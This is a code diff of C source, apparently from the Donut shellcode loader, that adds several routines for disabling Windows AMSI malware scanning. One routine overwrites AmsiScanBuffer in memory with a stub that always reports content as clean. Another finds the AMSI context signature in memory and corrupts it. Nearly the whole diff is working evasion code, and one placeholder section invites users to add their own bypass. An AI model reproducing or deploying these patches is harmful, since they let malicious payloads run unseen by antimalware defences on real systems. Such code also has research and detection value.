@@ -33,11 +33,67 @@
 
 #if defined(BYPASS_AMSI_A)
 
+DECLARE_HANDLE(HAMSICONTEXT);
+DECLARE_HANDLE(HAMSISESSION);
+
+// fake function that always returns S_OK and AMSI_RESULT_CLEAN
+static HRESULT AmsiScanBufferStub(
+  HAMSICONTEXT amsiContext,
+  PVOID        buffer,
+  ULONG        length,
+  LPCWSTR      contentName,
+  HAMSISESSION amsiSession,
+  AMSI_RESULT  *result)
+{
+    *result = AMSI_RESULT_CLEAN;
+    return S_OK;
+}
+
+static VOID AmsiScanBufferStubEnd(VOID) {}
+
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
-    HMODULE      dll;
-    PBYTE        cs;
-    DWORD        i, op, t;
-    BOOL         disabled = FALSE;
+    BOOL    disabled = FALSE;
+    HMODULE amsi;
+    DWORD   len, op, t;
+    LPVOID  cs;
+    
+    // load amsi
+    amsi = inst->api.LoadLibraryA(inst->amsi.s);
+    
+    if(amsi != NULL) {
+      // resolve address of function to patch
+      cs = inst->api.GetProcAddress(amsi, inst->amsiScan);
+      
+      if(cs != NULL) {
+        // calculate length of stub
+        len = (ULONG_PTR)AmsiScanBufferStubEnd -
+          (ULONG_PTR)AmsiScanBufferStub;
+          
+        // make the memory writeable
+        if(inst->api.VirtualProtect(
+          cs, len, PAGE_EXECUTE_READWRITE, &op))
+        {
+          // over write with code stub
+          memcpy(cs, &AmsiScanBufferStub, len);
+          
+          disabled = TRUE;
+            
+          // set back to original protection
+          inst->api.VirtualProtect(cs, len, op, &t);
+        }
+      }
+    }
+    return disabled;
+}
+
+#elif defined(BYPASS_AMSI_B)
+
+BOOL DisableAMSI(PDONUT_INSTANCE inst) {
+    HMODULE        dll;
+    PBYTE          cs;
+    DWORD          i, op, t;
+    BOOL           disabled = FALSE;
+    _PHAMSICONTEXT ctx;
     
     // load AMSI library
     dll = inst->api.LoadLibraryExA(
@@ -53,14 +109,15 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     
     // scan for signature
     for(i=0;;i++) {
+      ctx = (_PHAMSICONTEXT)&cs[i];
       // is it "AMSI"?
-      if(*(DWORD*)&cs[i] == inst->amsi.w[0]) {
+      if(ctx->Signature == inst->amsi.w[0]) {
         // set page protection for write access
         inst->api.VirtualProtect(cs, 4096, 
           PAGE_EXECUTE_READWRITE, &op);
           
         // change signature
-        cs[i]++;
+        ctx->Signature++;
         
         // set page back to original protection
         inst->api.VirtualProtect(cs, 4096, op, &t);
@@ -71,7 +128,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     return disabled;
 }
 
-#elif defined(BYPASS_AMSI_B)
+#elif defined(BYPASS_AMSI_C)
 
 // Attempt to find AMSI context in .data section of CLR.dll
 // Could also scan PEB.ProcessHeap for this..
@@ -138,7 +195,7 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     return disabled;
 }
 
-#elif defined(BYPASS_AMSI_C)
+#elif defined(BYPASS_AMSI_D)
 // This is where you may define your own AMSI bypass.
 // To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_AMSI_C defined.
 
@@ -147,4 +204,3 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
 }
 
 #endif
-
